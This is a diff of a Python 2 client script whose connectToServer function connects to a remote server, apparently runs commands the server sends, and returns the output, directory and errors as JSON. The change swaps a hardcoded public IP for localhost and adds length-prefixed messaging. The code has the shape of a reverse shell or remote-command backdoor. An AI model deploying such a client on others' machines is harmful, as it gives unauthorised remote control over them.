@@ -11,6 +11,7 @@
 import os  
 import subprocess
 import socket
+import struct
 #from socket import socket, AF_INET, SOCK_DGRAM
 
 import json
@@ -22,7 +23,7 @@ from os.path import expanduser
 
 def connectToServer():
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	# Create a socket object
-	host = '54.202.173.225' # Put in instance server's IPv4 Public IP
+	host = 'localhost' # Put in instance server's IPv4 Public IP - 54.202.173.225
 	port = 9999                # Port of server
 	print "Trying to connect to: {} at {}".format(host, port)
 	#s.connect(('2607:fea8:879f:f7b4:a5bf:e5e9:d8f1:2843', port,0,0))
@@ -99,12 +100,27 @@ def connectToServer():
 		sendBack["currentDir"] = newDir
 		sendBack["exception"] = str(exception)
 		sendBack["commandOutput"] = str(commandOutput)
-		print "sendBack is: {}".format(sendBack)
+		print "sendBack1 is: {}".format(sendBack)
 		
 		sendBackFormatted = json.dumps(sendBack) #data serialized
-		s.sendall(sendBackFormatted)
+		print "sendBack2 is: {}".format(sendBack)
+		
+		sendBackFormatted = str.encode(sendBackFormatted)
+		print "sendBack3 is: {}".format(sendBack)
+		
+		#s.sendall(sendBackFormatted)
+		send_msg(s, sendBackFormatted)
 		
 	s.close # Close the socket when done
+
+#------------------------------------------------------------------------------
+
+def send_msg(sock, msg):
+    # Prefix each message with a 4-byte length (network byte order)
+    msg = struct.pack('>I', len(msg)) + msg
+    sock.sendall(msg)
+
+#------------------------------------------------------------------------------
 
 # Example program
 if __name__ == "__main__":
